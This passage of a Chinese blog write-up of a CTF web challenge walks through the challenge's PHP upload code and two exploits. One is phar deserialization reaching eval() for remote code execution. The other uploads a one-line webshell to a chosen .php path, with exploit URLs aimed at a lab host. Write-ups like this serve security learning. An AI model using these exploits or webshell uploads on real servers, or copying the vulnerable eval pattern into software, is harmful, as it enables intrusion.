upload($file)&#123;</span><br><span class="line">        global $sandbox;</span><br><span class="line">        global $ext;</span><br><span class="line"></span><br><span class="line">        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">            $this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            if($file[&#x27;size&#x27;] &gt; 1024)&#123;</span><br><span class="line">                $this-&gt;cmd = &quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        global $sandbox;</span><br><span class="line">        global $ext;</span><br><span class="line">        // return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">        return $this-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;</span><br><span class="line">            $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $uploader = new Uploader();</span><br><span class="line">    $uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">    if(@file_get_contents($uploader))&#123;</span><br><span class="line">        echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents($uploader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同理也可得到home.php的源码，不过没有毛用</p>
+<p>后面的操作分为”phar反序列化rce”和”非预期直接getshell”两种方法</p>
+<p><b>phar反序列化RCE</b></p>
+<p>这是<font color=red>预期解法</font>，所以先介绍这种方法。<br>审计upload.php代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;Filename = $_GET[&#x27;name&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>可见<font color=red>$this-&gt;Filename</font>是可控的，可以通过<font color=red>name</font>参数以get方式得到<br>分析最后上传部分的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">    echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&quot;.$uploader.&quot;&quot;; echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font color=red>file_get_contents()</font>使<font color=red>$uploader</font>对象通过<font color=red>__toString()</font>返回<font color=red>$this-&gt;Filename</font>，由于<font color=red>phar:&#x2F;&#x2F;</font>伪协议可以不依赖<font color=red>unserialize()</font>直接进行反序列化操作，加之$<font color=red>this-&gt;Filename</font>可控，因此此处<font color=red>$this-&gt;Filename</font>配合phar反序列化后，<font color=red>__destruct()</font>方法内<font color=red>eval($this-&gt;cmd);</font>最终导致了远程代码执行 知道了这个思路，后面的事情就简单多了<br>由于<font color=red>__destruct()</font>方法中，想要e<font color=red>val($this-&gt;cmd);</font>的前提条件是<font color=red>$this-&gt;token</font>和<font color=red>$_SESSION[‘user’]</font>相等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">    if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;</span><br><span class="line">        $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;; </span><br><span class="line">    &#125;</span><br><span class="line">    eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<font color=red>__construct()</font>方法中可见如下两行代码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;; $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;</span><br></pre></td></tr></table></figure>
+
+<p>因此可以先随便上传一个txt，得到的路径中，.txt前面的就是<font color=red>$_SESSION[‘user’]</font></p>
+<p><img src="https://img-blog.csdnimg.cn/2020010918314745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="上传txt文件"></p>
+<p>首先生成phar文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109182214830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="生成phar文件"></p>
+<p>注意要将<font color=red>php.ini</font>中的<font color=red>phar.readonly</font>设置为<font color=red>off</font></p>
+<p><img src="https://img-blog.csdnimg.cn/20200109183212448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="设置php.ini"></p>
+<p>然后将生成的phar上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109183321803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="上传phar文件"></p>
+<p>得到路径</p>
+<blockquote>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;6cc53bf383ddeaaa6d5ddc8d05758e86&#x2F;GXYf966ca9e09125316b6bcc3a137f15449.txt</p>
+</blockquote>
+<p>然后将这个路径带上<font color=red>phar:&#x2F;&#x2F;</font>作为name参数的值，再随意上传一个文件，因为<font color=red>$this-&gt;Filename</font>被我们手工指定为phar，触发了phar反序列化导致命令执行。<br>最终exp：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10041/home.php?file=upload&amp;name=phar:///var/www/html/uploads/6cc53bf383ddeaaa6d5ddc8d05758e86/GXYf966ca9e09125316b6bcc3a137f15449.txt">http://172.21.4.12:10041/home.php?file=upload&amp;name=phar:///var/www/html/uploads/6cc53bf383ddeaaa6d5ddc8d05758e86/GXYf966ca9e09125316b6bcc3a137f15449.txt</a></p>
+</blockquote>
+<p>传任意文件后，得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109183346706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="得到flag"></p>
+<p><b>非预期解法：直接GETSHELL</b></p>
+<p>这是我做题时候用的方法，甚至不需要phar，属实迷惑行为 爆破密码登录，base64读upload.php源码，这都和上面一样。<br>审计upload.php的代码，发现在<font color=red>__construct()<font color=red>方法内<font color=red>$this-&gt;Filename<font color=red>可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#x27;name&#x27;]))&#123; $this-&gt;Filename = $_GET[&#x27;name&#x27;]; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><font color=red>upload()</font>内，只要文件小于1024，就将上传文件到<font color=red>$this-&gt;Filename</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>那我们只要使<font color=red>$this-&gt;Filename<font color=red>为<font color=red>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;1.php<font color=red>，然后上传一个txt的一句话即可getshell</p>
+<p>EXP:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10041/upload.php?name=/var/www/html/uploads/y1ng.php">http://172.21.4.12:10041/upload.php?name=/var/www/html/uploads/y1ng.php</a></p>
+</blockquote>
+<p>上传一个txt的一句话</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109183428672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="上传txt一句话"></p>
+<p>题目不太好使，要传两三次才能成功</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109183524100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="多上传几次"></p>
+<p>蚁剑之</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109183546925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="中国蚁剑"></p>
+<p>flag为：<font color=red>GXY{phar_1s_s0_danger}</font></p>
+<p>不得不说，多打了空格导致非预期1s_s0_danger_too哈哈哈哈</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yisosooo/article/details/101165258">https://blog.csdn.net/yisosooo/article/details/101165258</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.gem-love.com/category/ctf">https://www.gem-love.com/category/ctf</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247484608&idx=1&sn=a0d701f1932f0a235f0e2851dda61871&chksm=fd71118dca06989b853d5dac5322c3b80c1d1da84cfd36ed63b5e01c9c9d1dcddfb9942b6247&mpshare=1&scene=23&srcid=&sharer_sharetime=1577194302479&sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd">https://mp.weixin.qq.com/s?__biz&#x3D;MzU3ODc2NTg1OA&#x3D;&#x3D;&amp;mid&#x3D;2247484608&amp;idx&#x3D;1&amp;sn&#x3D;a0d701f1932f0a235f0e2851dda61871&amp;chksm&#x3D;fd71118dca06989b853d5dac5322c3b80c1d1da84cfd36ed63b5e01c9c9d1dcddfb9942b6247&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;&amp;sharer_sharetime&#x3D;1577194302479&amp;sharer_shareid&#x3D;0ed84c079a78a485e04fa50e826c0770#rd</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.pdsdt.lovepdsdt.com/index.php/2019/12/23/gxy_ctf-ginkgo/#babysqliv20">http://www.pdsdt.lovepdsdt.com/index.php/2019/12/23/gxy_ctf-ginkgo&#x2F;#babysqliv20</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/chasingin/article/details/103648441">https://blog.csdn.net/chasingin/article/details/103648441</a></li>
+<li><a target="_blank" rel="noopener" href="https://15h3na0.xyz/2019/12/21/GXYCTF%20Writeup/?from=groupmessage&nsukey=lzvye6q/D/d73PbgxMqA3t1DxnjpUe3yTT3gztom9yvT6aHP8oyN+WwMu6eAIJLKkr05h//GFMhJRtg3vr/672NqXNF6zHxP98AFe+aBct+l+v/fQ+PKzPRzEtaYulXDWeaMF4pHv0Rkf1wl1DHCUia/6U5cfvK/vRtLnewSYJMXTEbsThRyD1GRe+MKaGbqgbV6asYsarZu5GXWHpbXGw==#BabysqliV3-0">https://15h3na0.xyz/2019/12/21/GXYCTF%20Writeup/?from=groupmessage&nsukey=lzvye6q%2FD%2Fd73PbgxMqA3t1DxnjpUe3yTT3gztom9yvT6aHP8oyN%2BWwMu6eAIJLKkr05h%2F%2FGFMhJRtg3vr%2F672NqXNF6zHxP98AFe%2BaBct%2Bl%2Bv%2FfQ%2BPKzPRzEtaYulXDWeaMF4pHv0Rkf1wl1DHCUia%2F6U5cfvK%2FvRtLnewSYJMXTEbsThRyD1GRe%2BMKaGbqgbV6asYsarZu5GXWHpbXGw%3D%3D#BabysqliV3-0</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.mydamya.top/GXYCTF-writeup-Mini-Ginkgo/#more">https://www.mydamya.top/GXYCTF-writeup-Mini-Ginkgo/#more</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/12/25/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6CTF-wp/" data-id="cl1qb1dz2005pqktu62v3fdwa" data-title="北京工业大学CTF-wp" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/12/25/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          zip伪加密
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/12/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C--web--%E9%AB%98%E6%89%8B%E5%8C%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">攻防世界--web--高手区</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSharp/">CSharp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Cpp/">Cpp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/DVWA/">DVWA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP-Inventor/" rel="tag">APP Inventor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" rel="tag">信息安全数学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" rel="tag">教材答案</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" rel="tag">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/APP-Inventor/" style="font-size: 10.83px;">APP Inventor</a> <a href="/tags/Android/" style="font-size: 13.33px;">Android</a> <a href="/tags/C/" style="font-size: 16.67px;">C</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/CSharp/" style="font-size: 10px;">CSharp</a> <a href="/tags/CTF/" style="font-size: 19.17px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 12.5px;">DVWA</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 14.17px;">JavaScript</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/MySQL/" style="font-size: 10.83px;">MySQL</a> <a href="/tags/Reverse/" style="font-size: 11.67px;">Reverse</a> <a href="/tags/Web/" style="font-size: 17.5px;">Web</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/writeup/" style="font-size: 18.33px;">writeup</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" style="font-size: 10.83px;">信息安全数学</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 14.17px;">前端</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 10px;">区块链</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 10.83px;">协议</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15.83px;">密码学</a> <a href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" style="font-size: 13.33px;">库与模块</a> <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" style="font-size: 10.83px;">拒绝服务攻击</a> <a href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" style="font-size: 10px;">教材答案</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 15px;">数据结构</a> <a href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 15px;">牛客网</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 17.5px;">算法</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 16.67px;">经验</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 15.83px;">网络安全</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10.83px;">计算机网络</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" style="font-size: 15.83px;">计算机考研复试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/21/IDA%20Pro%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90dex%E6%96%87%E4%BB%B6/">IDA Pro静态分析dex文件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/13/%E7%BC%96%E5%86%99%E5%B9%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">编写并分析第一个Android应用程序</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/05/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/">Android四大组件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/25/%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6%E6%9C%AC%E7%A7%91%E7%94%9F%E6%B6%AF%E6%80%BB%E7%BB%93/">中国矿业大学本科生涯总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/19/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%80%83%E7%A0%94--%E5%A4%8D%E8%AF%95--%E6%9C%BA%E8%AF%95%E5%88%B7%E9%A2%98/">北京工业大学考研--复试--机试刷题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 iHui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
